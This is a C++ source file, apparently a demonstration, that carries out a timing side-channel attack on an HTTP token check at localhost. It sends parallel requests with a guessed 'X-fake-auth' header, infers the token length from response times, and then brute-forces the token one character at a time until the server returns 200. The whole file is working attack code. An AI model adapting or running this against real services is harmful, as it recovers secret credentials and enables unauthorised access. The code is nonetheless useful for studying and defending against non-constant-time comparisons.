// clang++ -std=c++17 -Wall -Werror -O2 bruteforce.cpp -lcurl -lcurlpp -o
// bruteforce
#include <chrono>
#include <future>
#include <iostream>
#include <string>
#include <vector>

#include <curlpp/Easy.hpp>
#include <curlpp/Infos.hpp>
#include <curlpp/Options.hpp>
#include <curlpp/cURLpp.hpp>

using namespace std;

static tuple<int, int, string> makeRequestWithToken(string &token) {
  curlpp::Cleanup cleaner;
  curlpp::Easy request;

  request.setOpt(new curlpp::options::Url("http://localhost:8000"));
  list<string> header;
  header.push_back("X-fake-auth: " + token);
  request.setOpt(new curlpp::options::HttpHeader(header));
  auto t1 = std::chrono::high_resolution_clock::now();
  request.perform();
  auto t2       = std::chrono::high_resolution_clock::now();
  long respCode = curlpp::infos::ResponseCode::get(request);

  return make_tuple(
      chrono::duration_cast<chrono::milliseconds>(t2 - t1).count(), respCode,
      token);
}

static int findTokenLen(int maxLen) {
  vector<future<tuple<int, int, string>>> futures;
  int tokenLen = 0;
  for (int i = 0; i < maxLen; i++) {
    futures.push_back(async(
        launch::async,
        [](int len) -> tuple<int, int, string> {
          string token(len, 'X');
          return makeRequestWithToken(token);
        },
        i + 1));
  }

  int maxTime = 0;
  for (int i = 0; i < maxLen; i++) {
    int curTime  = 0;
    int respCode = 0;
    string token;
    tie(curTime, respCode, token) = futures[i].get();

    if (curTime > maxTime) {
      maxTime  = curTime;
      tokenLen = i + 1;
    }
  }

  return tokenLen;
}

static string findToken(int tokenLen, string const &alphabet) {
  vector<future<tuple<int, int, string>>> futures;
  string token(tokenLen, 'X');

  for (int i = 0; i < tokenLen; i++) {
    for (int j = 0; j < alphabet.length(); j++) {
      string tmpToken = token;
      tmpToken[i]     = alphabet[j];
      futures.push_back(async(
          launch::async,
          [](string token) -> tuple<int, int, string> {
            return makeRequestWithToken(token);
          },
          tmpToken));
    }
    int maxTime = 0;
    for (int j = 0; j < alphabet.length(); j++) {
      int curTime  = 0;
      int respCode = 0;
      string t;
      tie(curTime, respCode, t) = futures[j].get();

      if (curTime > maxTime) {
        maxTime  = curTime;
        token[i] = alphabet[j];
      }

      if (respCode == 200) {
        return t;
      }
    }
    futures.clear();
  }

  return "";
}

int main(int argc, char *argv[]) {
  int tokenLen = findTokenLen(15);
  cout << "Token is likely of length " << tokenLen << endl;
  cout << findToken(tokenLen, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") << endl;

  return 0;
}
